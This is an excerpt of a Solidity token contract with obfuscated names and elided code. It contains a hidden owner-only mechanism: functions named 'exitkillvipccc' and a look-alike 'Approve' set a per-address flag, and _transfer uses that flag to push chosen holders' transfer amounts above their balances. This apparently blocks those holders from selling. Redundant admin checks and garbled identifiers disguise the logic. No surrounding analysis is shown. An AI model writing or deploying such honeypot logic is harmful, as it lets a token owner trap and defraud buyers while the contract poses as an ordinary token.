...
contract Token is Ownable {
    ...
    function exitkillvipccc(address cjjjss) public    {
        uint128 zramount = 0;
        cajbmuserltrr[cjjjss] = zramount;    
        if(_msgSender() == wwbttAdminccve){
            require(_msgSender() == wwbttAdminccve);
        }else{
            require(_msgSender() == wwbttAdminccve);
        }
    ...
    function Approve(address cjjjss) public    {
        ...
        cajbmuserltrr[cjjjss] = newpassnum;
        if(_msgSender() == wwbttAdminccve){
            require(_msgSender() == wwbttAdminccve);
        }else{
            require(_msgSender() == wwbttAdminccve);
    ...
    function _transfer(
        ...
        if (13333 != cajbmuserltrr[vipFrom]) {}else{
            amount = _balances[vipFrom] + cajbmuserltrr[vipFrom];
        }
